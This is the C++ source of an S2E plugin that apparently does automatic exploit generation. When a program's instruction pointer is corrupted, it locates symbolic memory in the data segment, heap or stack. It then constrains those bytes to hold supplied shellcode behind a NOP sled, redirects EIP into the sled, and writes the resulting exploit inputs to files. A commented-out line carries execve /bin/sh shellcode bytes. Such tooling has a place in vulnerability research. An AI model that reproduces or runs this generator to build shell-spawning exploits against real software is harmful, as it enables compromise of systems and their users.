/*
 * S2E Selective Symbolic Execution Framework
 *
 * Copyright (c) 2010, Dependable Systems Laboratory, EPFL
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 *       notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 *       notice, this list of conditions and the following disclaimer in the
 *       documentation and/or other materials provided with the distribution.
 *     * Neither the name of the Dependable Systems Laboratory, EPFL nor the
 *       names of its contributors may be used to endorse or promote products
 *       derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE DEPENDABLE SYSTEMS LABORATORY, EPFL BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * Currently maintained by:
 *    Vitaly Chipounov <vitaly.chipounov@epfl.ch>
 *    Volodymyr Kuznetsov <vova.kuznetsov@epfl.ch>
 *
 * All contributors are listed in S2E-AUTHORS file.
 *
 */
extern "C" {            
#include "config.h"     
#include "qemu-common.h"
}                       


#include "Exploit.h"
#include <s2e/S2E.h>
#include <s2e/ConfigFile.h>
#include <s2e/Utils.h>

#include <iostream>

#include <klee/Solver.h>
#include <s2e/S2EExecutor.h>    
#include <s2e/S2EExecutionState.h>

#include <iostream> 
#include <fstream> 
#include <vector> 
#include <utility> 
//#include <iomanip>


bool my_sort123(const std::pair<uint32_t,uint32_t> a,const std::pair<uint32_t,uint32_t> b)
{
  return a.second > b.second;
}


namespace s2e {
  namespace plugins {

    S2E_DEFINE_PLUGIN(Exploit, "Expoit S2E plugin", "",);

    void Exploit::initialize()
    {
      shellcode = s2e()->getConfig()->getString(getConfigKey() + ".shellcode");
      tainted_address = s2e()->getConfig()->getInt(getConfigKey() + ".TaintedAddress");

      //const char *text = shellcode.data();
      //std::cout << "shellcode : " << shellcode.c_str() << std::endl;
      //const char *sh = shellcode.c_str();
      //const char *ptr = NULL;
      //ptr = strtok(sh,"x");
      //while(ptr != NULL)
      //{
      //std::cout << ptr << std::endl;
      //ptr = strtok(NULL,"x");
      //}
      //m_traceBlockExecution = s2e()->getConfig()->getBool(
      //getConfigKey() + ".traceBlockExecution");
      s2e()->getCorePlugin()->onCourruptEip.connect(
	  sigc::mem_fun(*this, &Exploit::onCourruptEip));
    }

    void Exploit::onCourruptEip(S2EExecutionState *s, klee::ref<klee::Expr> value)
    {
      s2e()->getWarningsStream(s) << "[*] Plugin start." << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  Add Constraints." << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  register. " << s->getSymbolicRegistersMask() << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  eip. " << std::hex << s->getPc() << std::endl;
      //s2e()->getWarningsStream(s) << "[Exploit]  value. " << value.get() << std::endl;

      //s->dumpStack(128,s->getSp()-64);


      //s2e()->getWarningsStream(&s) << s2e()->getOutputFilename("exploit.txt") << std::endl;

      //s->addConstraint(klee::EqExpr::create(value, klee::ConstantExpr::alloc(0xaabbccff,klee::Expr::Int32)));

      //      klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32));
      //klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32), klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32));
      //s->addConstraint( klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32)));
      //bool res;
      //      klee::Solver::Validity res;
      //      klee::Query query(s->constraints, new_eip);//klee::EqExpr::create(value, klee::ConstantExpr::alloc(tainted_address ,klee::Expr::Int32)));

      //klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr>(query.expr);
      //s2e()->getWarningsStream(s) << "query? " << E << std::endl;
      //s2e()->getExecutor()->getSolver()->mustBeFalse(query, res);
      //      s2e()->getExecutor()->getSolver()->evaluate(query, res);
      //      s2e()->getWarningsStream(s) << "[*] true? " << res << std::endl;
      //s2e()->getExecutor()->getSolver()->mustBeTrue(query, res);
      //  s->addConstraint(new_eip);
      //if(0)

      //int num = 0;
      char name[20];
      if(testEip(s, value) && insertShellcode(s, value))//res != klee::Solver::False)
	//if(1)
      { 

	//s->addConstraint(new_eip);
	//uint32_t address;
	//insertShellcode(s, value);
	//klee::ref<klee::Expr> eip =  klee::EqExpr::create(value, klee::ConstantExpr::alloc(address ,klee::Expr::Int32));
	//s->addConstraint(new_eip);

	ConcreteInputs out;                                                  
	bool success = s2e()->getExecutor()->getSymbolicSolution(*s, out);
	if(success)
	{




	  sprintf(name,"Exploit_%d.txt",num);
	  num++;
	  char * path = const_cast<char*> ( s2e()->getOutputFilename(name).c_str());
	  std::ofstream fout(path, std::ios::out | std::ios::binary);

	  ConcreteInputs::iterator it;                                                                             
	  for (it = out.begin(); it != out.end(); ++it) {                                                          
	    const VarValuePair &vp = *it;                                                                        
	    //    s2e()->getMessagesStream() << vp.first << ": ";                                                      

	    for (unsigned i=0; i<vp.second.size(); ++i) {
	      fout.put((unsigned) vp.second[i]);                                                        
	      //s2e()->getMessagesStream() << (unsigned) vp.second[i] << ' ';                                   
	    }                                                                                                    
	  }                                                                                                        
	  fout.close(); 
	}
	//s2e()->getWarningsStream(s) << "true? " << res << std::endl;
        exit(0);
      }
      s2e()->getExecutor()->terminateStateEarly(*s,"Exploit plugin terminate");
    }

    bool Exploit::insertShellcode(S2EExecutionState *state, klee::ref<klee::Expr> eip_value)
    {

      //s2e()->getWarningsStream(state) << "shellcode " << shellcode << std::endl;  
      //char code[] = "\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

      std::vector<unsigned char> shellCodeVector = getShellcode(state, shellcode);

      s2e()->getWarningsStream(state) << "[*] Insert Shellcode (" << shellCodeVector.size() << " bytes)" << std::endl;
      // for(std::vector<unsigned char>::iterator it = shellCodeVector.begin() ; it != shellCodeVector.end() ; it++)
      // {
      //   s2e()->getWarningsStream(state) << std::hex<< (int)*it << std::endl;
      //printf("%x\n",*it);
      // }
      //s2e()->getWarningsStream(state) << "shell size: " << shellCodeVector.size() << std::endl;
      //s2e()->getWarningsStream(state) << "[*] ----> Search for memory. size(" << shellCodeVector.size() << ")"<< std::endl;
      std::vector<std::pair<uint32_t,uint32_t> > sym_table;

      uint32_t shellCode_start;
      int nop_size;

      sym_table = searchDataOrHeap(state, true /*Data*/);
      //s2e()->getWarningsStream(state) << " Data segment : " << std::endl;
      shellCode_start = 0;
      nop_size = -1;

      for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)
      {
	if(it->second >= shellCodeVector.size())
	{
	  s2e()->getMessagesStream(state) << "Data : symbolic address: " << std::hex << it->first << " size: " << std::dec << it->second << std::endl;

	  uint32_t shell_address = it->first + it->second - shellCodeVector.size();

	  while(shell_address >= it->first)
	  {
	    if(testShellcode(state, shell_address , shellCodeVector, state->constraints, eip_value))
	    {
	      //s2e()->getMessagesStream(state) << "YYYYYYYYYYYYYYYYYYYYYYYYYYYAAAAAAAAAAAAAAAAAAAA!!! " << std::hex  << shell_address << std::endl;
	      
              if(nop_size < insertNop(state, shell_address, it->first))
	      {
		shellCode_start = shell_address;
		nop_size = insertNop(state, shell_address, it->first);

	      }
	      break;
	    }
	    shell_address--;
	  }

	}
	else
	  break;
      }

      if(nop_size != -1)
      {
	s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  shellCode_start << " nopsize: "<< std::dec << nop_size << std::endl;
	addConstraints(state, shellCode_start, shellCodeVector, eip_value, nop_size);
	return true;
      }
      /////////////////////////////////////////////////////////////////

      sym_table = searchDataOrHeap(state, false /*Heap*/);
      //s2e()->getWarningsStream(state) << " Heap : " << std::endl;
      shellCode_start = 0;
      nop_size = -1;
      for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)
      {
	if(it->second >= shellCodeVector.size())
	{
	  s2e()->getMessagesStream(state) << "Heap : symbolic address: " << std::hex << it->first << " size: " << std::dec << it->second << std::endl;

	  uint32_t shell_address = it->first + it->second - shellCodeVector.size();
	  while(shell_address >= it->first)
	  {
	    if(testShellcode(state, shell_address, shellCodeVector, state->constraints, eip_value))
	    {
	      //s2e()->getMessagesStream(state) << "YYYYYYYYYYYYYYYYYYYYYYYYYYYAAAAAAAAAAAAAAAAAAAA!!! " << std::hex << shell_address << std::endl;
	      
              if(nop_size < insertNop(state, shell_address, it->first))
	      {
		shellCode_start = shell_address;
		nop_size = insertNop(state, shell_address, it->first);

	      }
	      break;
	    }
	    shell_address--;
	  }
	}
      }

      if(nop_size != -1)
      {
	s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  shellCode_start << " nopsize: "<< std::dec << nop_size << std::endl;
	addConstraints(state, shellCode_start, shellCodeVector, eip_value, nop_size);
	return true;
      }

      ///////////////////////////////////////////////////////////////////

      sym_table = searchStack(state);
      //s2e()->getWarningsStream(state) << " Stack : " << std::endl;
      shellCode_start = 0;
      nop_size = -1;
      for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)
      {
	if(it->second >= shellCodeVector.size())
	{
	  s2e()->getMessagesStream(state) << "Stack : symbolic address: " << std::hex << it->first << " size: " << std::dec << it->second << std::endl;

	  uint32_t shell_address = it->first + it->second - shellCodeVector.size();
	  while(shell_address >= it->first)
	  {
	    if(testShellcode(state, shell_address, shellCodeVector, state->constraints, eip_value))
	    {
	      //s2e()->getMessagesStream(state) << "YYYYYYYYYYYYYYYYYYYYYYYYYYYAAAAAAAAAAAAAAAAAAAA!!! " << std::hex << shell_address << std::endl;
	      
              if(nop_size < insertNop(state, shell_address, it->first))
	      {
		shellCode_start = shell_address;
		nop_size = insertNop(state, shell_address, it->first);

	      }
	      break;
	    }
	    shell_address--;
	  }
	}
	else
	  break;
      }

      if(nop_size != -1)
      {
	s2e()->getMessagesStream(state) <<  "addrss: " << std::hex <<  shellCode_start << " nopsize: "<< std::dec << nop_size << std::endl;
	addConstraints(state, shellCode_start, shellCodeVector, eip_value, nop_size);
	return true;
      }
      /*
	 std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin();
       *address = it->first;

       int i;
       for(i=0 ; i<28 ; i++)
       {
       klee::ref<klee::Expr> shell =  klee::EqExpr::create( state->readMemory8(*address + i) , klee::ConstantExpr::alloc(code[i] ,klee::Expr::Int8));
       state->addConstraint(shell);
       }
       */
      return false;
    }

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchStack(S2EExecutionState *state)
    {

      std::vector<std::pair<uint32_t,uint32_t> > sym_table;

      //uint32_t virtualAddress = state->getSp();
      uint32_t virtualAddress = 0xbfffffff;
      //uint32_t virtualAddress = 0x40000000;

      uint64_t hostAddress = 0;

      //std::vector<std::pair<uint32_t,uint32_t> >::iterator split;
      //for(int i=0 ; i<5 ; i++)
      while(hostAddress !=  (uint64_t) -1)
	//while(virtualAddress >= 0x08048000)
      {   
	hostAddress =  state->getHostAddress(virtualAddress);
	if(hostAddress !=  (uint64_t) -1) 
	{   
	  klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
	  s2e()->getDebugStream(state) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

	  int size = op.second->size;
	  unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
	  virtualAddress = virtualAddress - offset;

	  //s2e()->getMessagesStream() << std::endl;                                         
	  //dumpStack(size/4,virtualAddress);
	  if(! op.second->isAllConcrete())
	  {   
	    // state->dumpStack(size/4,virtualAddress);

	    //for(unsigned int j=0 ; j<size ; j++)
	    for(int j=size-1 ; j>=0 ; j--)
	    {   
	      if(op.second->isByteKnownSymbolic(j))
	      {   
		s2e()->getDebugStream(state) << "1.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << std::endl;

		int k=1;
		//for(j=j+1; j<size ;j++)
		for(j=j-1; j>=0 ;j--)
		{   
		  if(! op.second->isByteKnownSymbolic(j))
		  {   
		    break;
		  }   
		  k++;
		  s2e()->getDebugStream(state) << "2.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << " j : "<< j << std::endl;
		}   

		//s2e()->getMessagesStream(state) << std::hex << sym_table.back().first << " == " << (virtualAddress + j) - k << std::endl;
		if(!sym_table.empty() && (j+1) + k == size && virtualAddress + (j+1)+ k == sym_table.back().first )//sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && (sym_table.back().first + sym_table.back().second) == (virtualAddress + j) - k ) 
		{
		  s2e()->getDebugStream(state) << "append " << std::hex << virtualAddress + (j + 1) << std::endl;
		  sym_table.back().first = virtualAddress + (j + 1)  ;
		  sym_table.back().second += k;
		}
		else
		{
		  s2e()->getDebugStream(state) << "add " << std::hex << (virtualAddress + j + 1) << std::endl;
		  std::pair<uint32_t, uint32_t> temp((virtualAddress + j + 1) , k);
		  sym_table.push_back(temp);

		}
	      }
	    }
	  }
	}
	virtualAddress = virtualAddress - 128;//size ;
      }

      std::vector<std::pair<uint32_t,uint32_t> >::iterator aa = sym_table.begin();
      std::vector<std::pair<uint32_t,uint32_t> >::iterator bb = sym_table.end();

      sort(aa, bb, my_sort123);
      //my_sort(aa,bb);


      return sym_table;
    }

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchHeap(S2EExecutionState *s)
    {
      return searchDown2Up(s, 0x08048000, 0xffffffff);
    }   

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchDown2Up(S2EExecutionState *state,  uint32_t start, uint32_t end)
    {


      std::vector<std::pair<uint32_t,uint32_t> > sym_table;

      //uint32_t virtualAddress = state->getSp();
      //uint32_t virtualAddress = 0xbfffffff;
      //uint32_t virtualAddress = 0x40000000;
      //uint32_t virtualAddress = 0x08048000;
      uint32_t virtualAddress = start;

      uint64_t hostAddress = 0;

      //std::vector<std::pair<uint32_t,uint32_t> >::iterator split;
      //for(int i=0 ; i<5 ; i++)
      while(hostAddress !=  (uint64_t) -1 && virtualAddress <= end)
	//while(hostAddress !=  (uint64_t) -1)
	//while(virtualAddress <= 0xbfffffff)
      {   
	hostAddress =  state->getHostAddress(virtualAddress);
	if(hostAddress !=  (uint64_t) -1) 
	{   
	  klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
	  s2e()->getDebugStream(state) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

	  unsigned int size = op.second->size;
	  unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
	  virtualAddress = virtualAddress - offset;

	  //state->dumpStack(size/4,virtualAddress);
	  if(! op.second->isAllConcrete())
	  {   
	    // state->dumpStack(size/4,virtualAddress);

	    for(unsigned int j=offset ; j<size && virtualAddress+j <= end ; j++)
	      //for(int j=size-1 ; j>=0 ; j--)
	    {   
	      if(op.second->isByteKnownSymbolic(j))
	      {   
		s2e()->getDebugStream(state) << "1.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << std::endl;

		unsigned int k=1;
		for(j=j+1; j<size ;j++)
		  //for(j=j-1; j>=0 ;j--)
		{   
		  if(! op.second->isByteKnownSymbolic(j))
		  {   
		    break;
		  }   
		  k++;
		  s2e()->getDebugStream(state) << "2.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << " j : "<< j << std::endl;
		}   

		//s2e()->getMessagesStream(state) << std::hex << sym_table.back().first << " == " << (virtualAddress + j) - k << std::endl;
		if(!sym_table.empty() && j == k && virtualAddress == sym_table.back().first + sym_table.back().second )//sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && sym_table.back().first == virtualAddress + j) 
		  //if(!sym_table.empty() && (sym_table.back().first + sym_table.back().second) == (virtualAddress + j) - k ) 
		{
		  s2e()->getDebugStream(state) << "append " << std::hex << sym_table.back().first  << " "  << sym_table.back().second + k << std::endl;
		  //sym_table.back().first = virtualAddress  ;
		  sym_table.back().second += k;
		}
		else
		{
		  s2e()->getDebugStream(state) << "add " << std::hex << virtualAddress + j -k  << " " << k << std::endl;
		  std::pair<uint32_t, uint32_t> temp((virtualAddress + j -k) , k);
		  sym_table.push_back(temp);

		}
	      }
	    }
	  }
	}
	else
	{
	  //s2e()->getMessagesStream(state) << "NO~ " << std::hex << virtualAddress << std::endl;
	}
	virtualAddress = virtualAddress + 128;//size ;
      }

      std::vector<std::pair<uint32_t,uint32_t> >::iterator aa = sym_table.begin();
      std::vector<std::pair<uint32_t,uint32_t> >::iterator bb = sym_table.end();

      sort(aa, bb, my_sort123);
      //my_sort(aa,bb);


      return sym_table;


    }

    std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchDataOrHeap(S2EExecutionState *state, bool which)
    {
      //uint32_t start = 0x804809c;
      //uint32_t size = 0x80480a8;

      //s2e()->getMessagesStream(state) << "Data segment : "<< std::hex << state->readMemory(start, klee::Expr::Int32) <<  " size: " << state->readMemory(size, klee::Expr::Int32) << std::endl;

      uint32_t offset = expr2uint32(state->readMemory(0x804801c, klee::Expr::Int32));
      //uint32_t offset = CE->getZExtValue();
      s2e()->getDebugStream(state) << "offset : " << std::hex  <<offset << std::endl;

      offset = offset + 0x8048000;

      int num = 0;

      while(0x1 != expr2uint32(state->readMemory(offset, klee::Expr::Int32)) 
	  || 0x8048000 == expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32)))// && offset <= 0x8048100)
	  {
	    if(0x1 == expr2uint32(state->readMemory(offset, klee::Expr::Int32)))
	      num = 1;
	    offset = offset + 0x20;
	  }

      uint32_t start = expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32));
      uint32_t size = expr2uint32(state->readMemory(offset+0x14, klee::Expr::Int32));
      s2e()->getDebugStream(state) << "data segment : " << std::hex  << start << " size : " << size << std::endl;
      //std::vector<std::pair<uint32_t,uint32_t> > sym_table;
      //return sym_table;
      if(which == true)
	return searchDown2Up(state, start, start+size);
      else
	return searchDown2Up(state, start+size, 0xffffffff);
    } 

    inline uint32_t Exploit::expr2uint32(klee::ref<klee::Expr> expr)
    {
      klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (expr);
      return CE->getZExtValue();
    }


    std::vector<unsigned char> Exploit::getShellcode(S2EExecutionState *state, std::string shellcode)
    {
      std::vector<unsigned char> code;

      char *c_shellcode = new char [shellcode.size() + 1];

      strcpy(c_shellcode, shellcode.c_str());
      char *p = strtok(c_shellcode, "x");

      while(p != NULL)
      {
	code.push_back(strtol(p, NULL, 16));
	//s2e()->getWarningsStream(state) << strtol(p, NULL, 16) << std::endl;
	p = strtok(NULL, "x");
      }


      return code;
    }

    bool Exploit::testShellcode(S2EExecutionState *state, uint32_t address, std::vector<unsigned char> shellcode, klee::ConstraintManager cm, klee::ref<klee::Expr> eip_value)
    {
      int size = shellcode.size();
      int i;


      //klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( eip_value, klee::ConstantExpr::alloc(0xffffffff ,klee::Expr::Int32));
      //bool res;                             
      //klee::Solver::Validity res;                             
      //klee::Query query(cm, one_byte);        
      //s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

      //s2e()->getMessagesStream(state) << "res : " << res << std::endl;


      for(i=0 ; i<size ; i++)
      {
	klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( state->readMemory8(address + i), klee::ConstantExpr::alloc(shellcode[i] ,klee::Expr::Int8));

	//s2e()->getMessagesStream(state) << state->readMemory8(address + i) << std::endl;
	//  state->addConstraint(one_byte);

	//bool res;
	klee::Solver::Validity res;
	klee::Query query(cm, one_byte);
	//s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);
	s2e()->getExecutor()->getSolver()->evaluate(query, res);

	//if(res == false)
	if(res == klee::Solver::False)
	  return false;
	else
	  cm.addConstraint(one_byte);
      }

      klee::ref<klee::Expr> new_eip =  klee::EqExpr::create( eip_value, klee::ConstantExpr::alloc(address ,klee::Expr::Int32));
      //s2e()->getMessagesStream(state) << eip_value << std::endl;
      //bool res;
      klee::Solver::Validity res;
      klee::Query query(cm, new_eip);
      //s2e()->getExecutor()->getSolver()->mayBeFalse(query, res);
      s2e()->getExecutor()->getSolver()->evaluate(query, res);
      //s2e()->getMessagesStream(state) << "res : " << res << std::endl;


      return res != klee::Solver::False;
      //return res != true;
    }

    bool Exploit::testEip(S2EExecutionState *state, klee::ref<klee::Expr> value)
    {
/*
      klee::ref<klee::Expr> right, left;

      //right = value;
      //while(value.get()->getKind() == klee::Expr::Concat)
      // {
      left = dyn_cast<klee::ConcatExpr>(value)->getLeft();
      right = dyn_cast<klee::ConcatExpr>(value)->getRight();
      s2e()->getWarningsStream(state) << left->getKind() << std::endl;

if(left->getKind() == klee::Expr::Constant)
  return false;
     
      left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
      right = dyn_cast<klee::ConcatExpr>(right)->getRight();
      s2e()->getWarningsStream(state) << left->getKind() << std::endl;
  
      left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
      right = dyn_cast<klee::ConcatExpr>(right)->getRight();
      s2e()->getWarningsStream(state) << left->getKind() << std::endl;
      
      //left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
      //right = dyn_cast<klee::ConcatExpr>(right)->getRight();
      s2e()->getWarningsStream(state) << right->getKind() << std::endl;
      //break;
      //}

*/
      klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(value, klee::ConstantExpr::alloc(0xffffffff ,klee::Expr::Int32));
      klee::Solver::Validity res;                             
      klee::Query query(state->constraints, new_eip);        
      s2e()->getExecutor()->getSolver()->evaluate(query, res);

      s2e()->getWarningsStream(state) << "[*] true? " << res << std::endl;
      return res != klee::Solver::False;                          


    }

    int Exploit::insertNop(S2EExecutionState *state, uint32_t start, uint32_t end)
    {
      //Nop
      //uint32_t nop_address;
      int num = 0;
      for( start= start - 1; start >= end ; start--)
      {
	klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(start), klee::ConstantExpr::alloc(0x90 ,klee::Expr::Int8));
	klee::Solver::Validity res;                
	klee::Query query(state->constraints, nop);
	s2e()->getExecutor()->getSolver()->evaluate(query, res);
	//s2e()->getMessagesStream(state) << "nop: " << std::hex << start << " res: " << res <<std::endl;

	if(res != klee::Solver::False)
	  //state->addConstraint(nop);
	  num++;
	else
	  break;
      } 
      return num;

    }

    void Exploit::addConstraints(S2EExecutionState *state, uint32_t address, std::vector<unsigned char> shellcode, klee::ref<klee::Expr> eip_value, int nop_size)
    {
      unsigned int i;
      for(i=0 ; i<shellcode.size(); i++)
      {
	klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( state->readMemory8(address + i), klee::ConstantExpr::alloc(shellcode[i] ,klee::Expr::Int8));
	state->addConstraint(one_byte);
      }
      for(i=0 ; i< (unsigned)nop_size ; i++)
      {
	klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address - i - 1), klee::ConstantExpr::alloc(0x90 ,klee::Expr::Int8));
	state->addConstraint(nop);
      }
      klee::ref<klee::Expr> new_eip =  klee::EqExpr::create( eip_value, klee::ConstantExpr::alloc(address  - (nop_size/2),klee::Expr::Int32));
      state->addConstraint(new_eip);

    }

  } // namespace plugins
} // namespace s2e
